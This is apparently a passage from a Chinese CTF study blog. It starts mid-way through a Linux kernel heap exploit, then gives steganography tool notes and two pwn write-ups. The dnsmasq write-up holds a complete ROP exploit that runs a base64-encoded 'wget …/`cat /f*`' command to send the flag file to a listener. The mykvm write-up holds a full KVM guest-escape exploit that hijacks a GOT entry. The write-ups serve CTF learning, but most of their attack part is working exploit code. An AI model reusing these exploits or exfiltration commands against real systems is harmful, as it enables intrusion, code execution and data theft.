      if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
          perror("[-] socketpair");
          return -1;
      }
    }
    for(int i = 0;i<200;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    puts("[2-2]leak msg_msg == skb_buffer");//此时msg_msg和skb_buffer会喷在一个对块里面
    int msg_key,skb_key;
    uint64_t heap_addr,heap_addr1;
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x1000-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-3]leak heap_addr");//通过泄漏堆地址来造msg_msg上的任意msg_msg的free
    if(msg_key != 0){
      for(int i = 0;i<(0x1000-0x30)/0x8;i++ ){
        printf("%d => %llx\n",i,*(uint64_t*)(buf + i*8) );
        if(*(uint64_t*)(buf + i*8) == 1 && *(uint64_t*)(buf + (i+1)*8) == 0x1d0 ){
          heap_addr = *(uint64_t*)(buf + (i-2)*8);
          heap_addr1 = *(uint64_t*)(buf + (i-1)*8);
          printf("heap leak: 0x%llx\n",heap_addr);
          break;
        }
      }
    }
    puts("[2-4]free skb_buffer to hijack msg_msg");//造任意msg_msg free
    if (read(ss[skb_key][1], buf, 0x200-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)buf = heap_addr;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x200-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 200;i<300;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x200-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        // msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-5] free 0x400 msg_msg");
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 0x2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 300;i<310;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    //show_msg是以idx为基准的
    int skb_buf1,skb_buf2;
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf1 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf1 :%d\n",*(uint64_t*)(buf + 8*3));
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 310;i<330;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf2 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf2 :%d\n",*(uint64_t*)(buf + 8*3));
    if (read(ss[skb_buf1][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    //整理碎片
    for(int i = 330;i < 340;i++){
      // *(uint64_t*)(buf+8*8) = i;
      memset(buf,'x',0x400);
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    puts("[3-1] pipe_prime");
    puts("pipe buffer");
    int pipefd[5][2];
    for(int i = 0;i<5;i++){
      if (pipe(pipefd[i]) < 0) {
          perror("[-] pipe");
          return -1;
      }
      memset(buf,"x",0x400);
      const unsigned pipe_size = fcntl(pipefd[i][1], F_GETPIPE_SZ);
      static char buffer[4096];
      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(pipefd[i][1], buffer, n);
        r -= n;
      }

      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(pipefd[i][0], buffer, n);
        r -= n;
      }
      int attack_fd = open("/bin/busybox",O_RDONLY);
      if(attack_fd < 0){
          perror("open");
          _exit(0);
      }
      loff_t offset = 0x1fdac8;
      splice(attack_fd,&offset,pipefd[i][1], NULL, 1, 0);
    }
    if (read(ss[skb_buf2][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)(buf + 3*8) = 0x10;
    //整理碎片
    for(int i = 340;i < 370;i++){
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0 ;i< 5;i++){
      if (write(pipefd[i][1],attack_data, sizeof(attack_data)) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0;i<5;i++){
      close(pipefd[i][1]);
      close(pipefd[i][0]);
    }
    memset(msgbuf.mtext,'\x00',0x400);
    for(int i = 1000;i<1100;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);//避免pipe_buffer和skb_buffer释放的时候造成double free的错误
    }
    logi("Enter exit");
    // __pause("debug");
    // system("/bin/sh");

}
```





## Misc with CTF 🤹

### 0宽隐写一把锁

https://yuanfux.github.io/zero-width-web/

### 2张图片盲水印

用BlindWaterMark 

```
python bwm.py decode ./ta.png ./tb.png flag.png
python3 bwmforpy3.py decode --oldseed ./ta.png ./tb.png out1.png

python3 bwmforpy3.py decode ./ta.png ./tb.png out1.png
```



### png隐写

zsteg一把梭检测 lsb隐写 以及 png是否包含内容

```bash
zsteg --all 00000646.png
# 提取解压
zsteg 00000646.png -E b1,r,lsb,xy > 1.zip
```

stegsolve 查通道图



### MP3Stego隐写

```bash
没密码
./Decode.exe -X cipher.mp3
有密码
./Decode.exe -X -P xxx cipher.mp3
```



### 分离

foremost 分离文件包含

```bash
foremost 1.jpg
```



### 二维码扫码

https://merricx.github.io/qrazybox/

### zip伪加密

504B0102 ：目录区 全局方位标记为0900==加密/0000 == 无加密

504B0304 ：数据区 0900==加密 

![CTF misc zip、rar文件伪加密_数据区](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/17110420_62abef34087ca67794.png)

### rot47解密

https://rot47.net/

```
2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
```

## Pwn challenge 🤺

### 2022ACTF master_of_dns

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155042.png)

题目起了一个dns服务器，通过idaf12搜索版本号可以知道版本为
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155141.png)

下载一个dnsmasq进行编译，这里还要注意编译的gcc版本
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155352.png)

```
wget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz
tar -zxvf dnsmasq-2.86.tar.gz
cd dnsmasq-2.86
添加
# CFLAGS        = -m32 -fno-stack-protector
# LDFLAGS       = -m32 -no-pie
make
```

编译好了以后用ida进行binddiff，选择相似度不为百分之百的函数进行查看，其中extract_name函数中，题目给的版本多了一个memcpy函数，由于没有PIE，我们直接下断点，看它的参数
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155509.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155645.png)


![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227132854.png)

结合IDA看栈是0x381+4=0x385的溢出，同时溢出的n是有限制的，但是任然满足栈溢出条件

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155756.png)

编写脚本确认溢出，由于不知道报文的具体发送方式，常规思路可能会选择逆向报文，但这里可以用winshark抓包(这里UDP BP感觉应该抓不了)
```shell
dig @127.0.0.1 -p 9999 baidu.com
```

由于本地服务起在127.0.0.1上，监听lo即可，很快就抓到了报文，但是数据包时data格式，这里右键data，选择协议首选项
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227160517.png)

然后就能正常识别了，观察查询请求的包，由于溢出部分只是域名部分，这里我们主要关注域名
这个包里必须字段为Domain Name System这个段
在dns请求报文中，域名字段，通过"."分隔开，点与点之间的字符个数必须<=0x3f
而且会把baidu.com其中的点拆成长度 \x05 baidu \x03 com \x00
我们保留这一段的头尾，就替换域名部分，'\x3f'+'a'\*0x3f为一段，共长0x40，我们给0x10试试
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227160536.png)

确认能溢出后，进一步调整长度0x385，尝试控制执行流到beef

```python

head = "24b401200001000000000001".decode("hex")
payload = ("\x3f"+'a'*0x3f)*14+"\x04aaaa"
payload += "\x04beef"

end =  '\x00'+"00010001".decode("hex")

s(head+payload+end)
```

也没问题，接下来就是如何带flag回来了，这里是UDP，再一个ORW确实麻烦。这里考虑用system或者popen执行反弹shell语句。这里利用wget去获取127.0.0.1/flag{xxx}，然后另一端在80端口监听即可拿到结果

```python
# cmd = b'wget `echo -e "%s"`/`cat /flag`' % (vps.replace(b'.',b'\\x2e'))
cmd = b"echo d2dldCAxMjcuMC4wLjEvYGNhdCAvZipgCg== | base64 -d | sh"
# wget 127.0.0.1/`cat /f*`


nc -l 80

➜  attachment sudo nc -l 80
GET /flag%7Bpwnbye4l4%7D HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 127.0.0.1
Connection: Keep-Alive
Connection: Keep-Alive

```

程序里正好有popen函数，然后就是找gadget给参数赋值
+ popen的2个参数必须都是字符串，"r"有了，但是cmd还没有
+ 不能有空字符

```c
.text:08071802 52                            push    edx                             ; modes
.text:08071803 50                            push    eax                             ; command
.text:08071804 E8 37 93 FD FF                call    _popen
```

观察crash时的栈状态
edx为memcpy赋值栈地址的开始，但edx是第二个参数的赋值寄存器，只需要"r"，不需要我们输入，而eax我们缺难以赋值为有效的地址(这里2个参数都是地址)，所以考虑使用gadget将edx的值赋值给eax

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227161823.png)

这里有多可以考虑的汇编指令

```
xchg 交换寄存器
add 加减 给一目标寄存器赋0也能实现效果

ROPgadget --binary ./dns  | grep  "xchg eax, edx"
ROPgadget --binary ./dns  | grep  "add eax, edx" | grep ret
ROPgadget --binary ./dns  | grep  "xor eax, eax"
ROPgadget --binary ./dns  | grep ret |grep  "mov eax, 0"
ROPgadget --binary ./dns  | grep ret | grep -v "ret " | grep  ": add eax, 0x"
```

结合这几点最终的思路是，给eax一个负数，这样只需要对它进行add操作就能控制eax的值。问题在于payload只能连续0x3f，所以要控制ROP的部分在0x3f以内，还好是32位比较好实现。正好溢出长度能满足2段ROP，一段放ROP，一段放cmd字符串。这里还有一个问题，就是直接把cmd放在开头好不好，在实际执行过程中会导致在执行函数时会向低位增长，可能会把cmd覆盖掉导致无法顺利执行。最好的情况还是放到高位上。

写EXP的tips

```python
# 在python2下
head = "61".decode("hex")
# 将其识别为16进制数的拼接字符串，将其转化为字节流


# system(cmd)/popen(cmd,"r"/"w")
cmd_string = base64.b64encode("wget 127.0.0.1/`cat /f*`")
cmd = "echo {} | base64 -d | sh".format(cmd_string)

```


EXP

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256
from scapy.all import *
import base64

p = remote("127.0.0.1","9999",typ="udp")
# p = process("./pwn")
elf = ELF("./dns")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


pop_rax = 0x08059d44
add_eax_xxx = 0x08094d60 # : add eax, 0x11038 ; nop ; pop ebp ; ret
add_eax_edx = 0x0804b639 # : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret
pop_edx = 0x0807ec72 # : pop edx ; ret
popen = 0x08071802


head = "24b401200001000000000001".decode("hex")
end =  '\x00'+"00010001".decode("hex")


pay = p32(pop_rax) + p32(0xfffef38d)
pay += p32(add_eax_xxx)+'aaaa'+p32(add_eax_edx)+'aaaa'*6
pay += p32(pop_edx) +p32(0x0809C7B2)# r
pay += p32(popen)


cmd_string = base64.b64encode("wget 127.0.0.1/`cat /f*`")
cmd = "echo {} | base64 -d | sh".format(cmd_string)


payload = head
payload += ("\x3f"+'a'*0x3f)*14+"\x04aaaa"
payload += '\x3f'+ pay.ljust(0x3f,'a') # 0x385+0x40=0x3c5  0x11038+0xfffef38d=0x3c5
payload += chr(len(cmd)).encode()+ cmd
payload += end

# # print(hex(len(pay))) 0x38

s(payload)


ia()
```


### 2022ACTF mykvm

一道kvm的题目

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228191717.png)

主函数会malloc一个0x20的堆块放置在bss段上以存储hostname

然后就是输入code代码，以及guest name 和 guest passwd ，然后进入一个KVM的函数实现虚拟机执行命令

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228191749.png)

kvm函数如下，kvm的启动可以参照API文档，https://lwn.net/Articles/658511/，其中涉及很多宏的使用

```c
KVM_CREATE_VM 0xae01
KVM_SET_USER_MEMORY_REGION 0x4020ae46
KVM_CREATE_VCPU 0xae41
KVM_GET_VCPU_MMAP_SIZE 0xae04
KVM_GET_REGS 0x8090ae81
KVM_SET_REGS 0x4090ae82
KVM_GET_SREGS 0x8138ae83
KVM_SET_SREGS 0x4138ae84
KVM_RUN 0xae80
```


```c
unsigned __int64 __fastcall sub_400B92(const void *code, size_t codesize)
{
  int kvmfd; // [rsp+10h] [rbp-220h]
  int vmfd; // [rsp+14h] [rbp-21Ch]
  int vcpu; // [rsp+1Ch] [rbp-214h]
  size_t vcpu_mmap_size; // [rsp+30h] [rbp-200h]
  kvm_run *run_mem; // [rsp+38h] [rbp-1F8h]
  kvm_userspace_memory_region region; // [rsp+40h] [rbp-1F0h] BYREF
  char v9[48]; // [rsp+60h] [rbp-1D0h] BYREF
  __int64 v10; // [rsp+90h] [rbp-1A0h]
  kvm_regs guest_regs; // [rsp+E0h] [rbp-150h] BYREF
  unsigned __int64 v12; // [rsp+228h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  kvmfd = open("/dev/kvm", 0x80002); //这部分代码打开 /dev/kvm 设备，获取 KVM 文件描述符。如果打开失败，程序将退出。
  if ( kvmfd == -1 )
    errx(1, "failed to open /dev/kvm");
  vmfd = ioctl(kvmfd, 0xAE01uLL, 0LL); //使用 ioctl 系统调用和KVM 文件描述符来创建一个新的虚拟机，并获取虚拟机的文件描述符。
  memcpy(
    (&unk_602100 - (((((&unk_602100 >> 31) >> 20) + &unk_602100) & 0xFFF) - ((&unk_602100 >> 31) >> 20)) + 4096),// 0x603000
    code,
    codesize);// 这里是让函数地址取整，0x602100 -> 0x603000
  region.slot = 0; // 设置一个内存区域（kvm_userspace_memory_region），包括虚拟机内的物理地址、大小以及对应的用户空间地址。这个内存区域随后通过 ioctl 调用添加到虚拟机中。
  region.flags = 0;
  region.guest_phys_addr = 0LL;
  region.memory_size = 0x40000000LL;
  region.userspace_addr = (&unk_602100
                         - (((((&unk_602100 >> 31) >> 20) + &unk_602100) & 0xFFF)
                          - ((&unk_602100 >> 31) >> 20))
                         + 4096);
  ioctl(vmfd, 0x4020AE46uLL, &region);
  vcpu = ioctl(vmfd, 0xAE41uLL, 0LL); //创建一个虚拟 CPU 并获取相关的信息，如 mmap 大小，然后将其映射到内存中。 vcpu作用于实模式
  vcpu_mmap_size = ioctl(kvmfd, 0xAE04uLL, 0LL);
  run_mem = mmap(0LL, vcpu_mmap_size, 3, 1, vcpu, 0LL);
  ioctl(vcpu, 0x8090AE81uLL, v9); // 初始化虚拟 CPU 的寄存器值。
  guest_regs.rax = 0LL;
  v10 = 0x4000LL;
  guest_regs.rbx = 2LL;
  ioctl(vcpu, 0x4090AE82uLL, v9); // 设置虚拟CPU的值
  ioctl(vcpu, 0x8138AE83uLL, &guest_regs.rcx); //获取sregs的值
  WORD2(guest_regs.rdx) = 0;
  guest_regs.rcx = 0LL;
  ioctl(vcpu, 0x4138AE84uLL, &guest_regs.rcx); //设置sregs的值
  while ( 1 )
  {
    ioctl(vcpu, 0xAE80uLL, 0LL); //这是函数的核心循环，它不断运行虚拟机并根据不同的退出原因（例如 I/O 操作、HLT 指令等）进行处理。
    switch ( run_mem->exit_reason )
    {
      case 2u:
        putchar(*(&run_mem->request_interrupt_window + run_mem->io.data_offset));
        break;
      case 5u:
        fwrite("KVM_EXIT_HLT\n", 1uLL, 0xDuLL, stderr);
        return __readfsqword(0x28u) ^ v12;
      case 8u:
        errx(1, "KVM_EXIT_SHUTDOWN");
      case 9u:
        errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx", run_mem->hw.hardware_exit_reason);
      case 0x11u:
        errx(1, "KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x", run_mem->ex.exception);
      default:
        errx(1, "Unhandled reason: %d", run_mem->exit_reason);
    }
  }
}
```

也就是说，我们输入的code会从栈上memcpy到bss段的0x603000上，而这个0x603000又会被KVM当作内存的开始，我的code就类似于BIOS的存在。

这部分建议阅读
电脑是如何启动的：<https://www.ruanyifeng.com/blog/2013/02/booting.html>

那么漏洞点在哪呢，主要有几处
1、首先是虚拟机的内存大小设置为0x40000000，而0x603000~0x603000+0x40000000包含了./mykvm(主程序)的堆地址，这就导致虚拟机能访问主程序堆地址的内容
2、由于是实模式16位寻址，即2字节，实模式利用一种称为"段:偏移"的方式来扩展寻址能力，最大能够寻址1MB（2^20字节）的物理内存，也就是20位寻址，0x00000 到 0xFFFFF。意味着虚拟机实际能操作的范围为0x603000~0x603000+0xFFFFF，这仍然可能包括堆地址，堆中会有一些main_arena的地址
3、readline函数是libreadline.so.6中的一个库函数
```c
void *__fastcall sub_400F28(__int64 a1)
{
  if ( ptr )
  {
    free(ptr);
    ptr = 0LL;
  }
  ptr = (void *)readline(a1);
  if ( ptr && *(_BYTE *)ptr )
    add_history((__int64)ptr);
  return ptr;
}
```

readline() 的参数是一个字符串，会先输出再读取一行输入，然后返回一个堆块指针。原则上需要free。这里也没有free，连续三次的readline()可以使用同一个堆块，结合我们虚拟机能操作主程序堆段的漏洞，就可以控制输入的内容(本来可以用户控制，这里是指虚拟机控制)。readline()函数会将\x7f作为Delete信号识别，所以输入的内容要控制没有"7f"

4、主函数里读入code的时候采用scanf读入，原则上这段code会被读入栈上，然后被memcpy到0x603000，而memcpy不会被零截断，这样以来栈上的一些值就会被放到bss里
```c
    puts("your code size: ");
    __isoc99_scanf("%d", codesize);
    if ( codesize[0] <= 4096 )
```


这里讲一下题目的启动和调试，由于题目给了docker环境，这里可以直接使用docker进行调试

```shell
docker build -t mykvm .
docker run --privileged --rm -p 8000:8888 -p 1234:1234 -d  mykvm:latest
# --privileged参数用于支持KVM
运行带有pause()的脚本

sudo gdb -p `pidof mykvm`
```


首先是泄露libc，如果泄露也是可以的，通过out指令实现，这也算是官方WP的实现<https://github.com/team-s2/ACTF-2022/blob/main/pwn/mykvm/exploits/exp.py>

```python
shellcode = asm('''
    .code16
    mov al, 0x57  ;"W"
    mov dx, 0x217 ;这里测试为任何值都可以
    out dx, al
    mov al, 10 ;"/n"
    out dx, al
    hlt
''')
```

读端口用IN指令，写端口用OUT指令

```c
IN AL,21H；表示从21H端口读取一字节数据到AL

IN AX,21H；表示从端口地址21H读取1字节数据到AL，从端口地址22H读取1字节到AH

MOV DX,379H
IN AL,DX ；从端口379H读取1字节到AL


OUT 21H,AL；将AL的值写入21H端口
OUT 21H,AX；将AX的值写入端口地址21H开始的连续两个字节。（port[21H]=AL,port[22h]=AH）

MOV DX,378H
OUT DX,AX ；将AH和AL分别写入端口379H和378H
```

这里要考虑如何去最终获取shell，结合got表可写和libc-2.23，可以考虑劫持got表为one_gadget，比如puts，在主程序的最后会输入hostname对主程序bss段上的dest变量进行写入，那是一个bss段变量

```c
      memcpy(dest, *&codesize[1], 0x20uLL);
      puts("Bye!");
```

这里看一下memcpy的原型，其参数为2个指针，意味着数据会被copy到dest指向的堆块中

```c
void *memcpy(void *dest, const void *src, size_t n);
```

而dest 0x60A100正好在虚拟机内存范围内，我们可以将其改为got表的地址，然后再篡改读readline读入堆块里的内容(实测只会清空前8字节的内容)，这样就能修改了。
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231229110828.png)
写汇编的思路：
先拿一个堆地址检测是否堆段在1M范围内，在的话就执行后续payload，不在就控制输出来导向新的remote
先去栈上拿一个libc地址，然后放到bss段上
然后再去拿dest堆块的地址，这个在bss段上，通过字符串搜索搜索到对应的readline堆块的地址，处理后也放到bss段上
然后计算出one_gadget的地址，将其赋值给readline堆块+8，再将dest的值换成putchar的got表地址
这里在对readline堆块+8堆块赋值时，由于实测这个地址大概为0x0157f8(KVM地址)，超过了实模式2字节的寻址范围，所以要用ds段寄存器进行寻址

EXP

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1",8000) #typ="udp"
# p = process("./bin/mykvm")
# elf = ELF("./mykvm")
# libc = elf.libc

# context.log_level = "debug" # info
# context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

p = remote("127.0.0.1",8000)

# libc in stack
# heap_input
# heap+8 in kvm
# got

code = asm('''
    .code16gcc
    jmp main
    .rept 40
    .byte 0x00
    .endr

main:
    mov eax,[0x7100]   
    sub eax,0x603000
    cmp eax,0xfd800
    jb next
    mov ebx,0
    div eax,ebx 

next:
    mov ebx, [0x568]
    add ebx,0x2270cf
    mov [0x7200], ebx
    mov ebx,[0x56c]
    mov [0x7204], ebx

    mov ebx,[0x7100]
    add ebx,0x27e0
    mov [0x7220],ebx

    mov edx,[0x7200]
    add edx,0x4527a	
    push edx

    add ebx,0x8	
    sub ebx,0x603000
    mov eax,ebx

    shr eax,16
    shl eax,12
    mov ds,eax			
    pop edx
    mov ds:[bx],edx

    mov ebx,0x602020
    mov eax,0
    mov ds,eax
    mov [0x7100],ebx
    hlt
''')


c = 1
while c:
    # pause()
    sla("your code size: ",4096)
    sla("your code:",code)
    sla("guest name:",'e4l4')
    sla("guest passwd:",'e4l4')
    # sla("host name: ",'e4l4')
    p.recvline()
    ret = r(0x1b)
    if "mykvm" not in ret:
	    # pause()
        c = 0
        print("got it!!!")
        sl("e4l4")
        break        
    p.close()
    p = remote("127.0.0.1",8000)
    
ia()
```

官方的题解是从16位实模式切换到32位保护模式再进行利用，这里也进行进一步的学习
什么是实模式和保护模式：<https://www.cnblogs.com/kelamoyujuzhen/p/10555924.html>
linux分页的机制：<https://zhuanlan.zhihu.com/p/458935522>
详细内容参考：16位实模式切换32位保护模式过程详解:https://bbs.kanxue.com/thread-269223.htm


> [!NOTE] 笔记
> 16位寻址 2字节 0x1234  20位 0x1234567
> 32位寻址 4字节 0x12345678
> 3个16进制数能表示的范围正好就是4KB，即一页
> 逻辑地址 –[分段]–》 线性地址 –[分页]–》 物理地址
> 
> 
> 

两个进程虚拟地址相同，映射的物理地址也是不同的

```
虚拟内存:  [页0] [页1] [页2] [页3]
物理内存: [页A] [页B] [页C] [页D]


页表:
| 虚拟页号 | 物理页号 | 标志 |
|----------|----------|------|
|    0     |    B     |  RW  |
|    1     |    A     |  R   |
|    2     |    D     |  RW  |
|    3     |    C     |  R   |
```

段标识符长8字节，16位实模式通过GDT全局描述符表寻址，16位正好表示下标

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228134405.png)

一般会在MBR(”这最前面的512个字节，就叫做"主引导记录"（Master boot record，缩写为MBR）“)载入启动管理器中进行实模式到保护模式的切换。然后就能装载加载内核的程序了
从实模式切换到保护模式大致可以分为以下几个步骤：
屏蔽中断
初始化全局描述符表（GDT）
将CR0寄存器最低位置1
执行远跳转
初始化段寄存器和栈指针

实际上可以简化为一个模板
```c
org 0 
cli                     ; 屏蔽中断
 
lgdt [gdt_descriptor]   ; 初始化GDT
 
; 把 cr0 的最低位置为 1，开启保护模式
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain
 
[bits 32]
PModeMain:
    mov ax, 0x10        ; 将数据段寄存器ds和附加段寄存器es置为0x10
    mov ds, ax         
    mov es, ax
    mov fs, ax          ; fs和gs寄存器由操作系统使用，这里统一设成0x10
    mov gs, ax
    mov ax, 0x18        ; 将栈段寄存器ss置为0x18
    mov ss, ax
    mov ebp, 0x7c00     ; 现在栈顶指向 0x7c00
    mov esp, ebp

	xxx
    hlt

gdt_start:
; 第一个描述符必须是空描述符
gdt_null:
    dd 0
    dd 0
; 代码段描述符
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
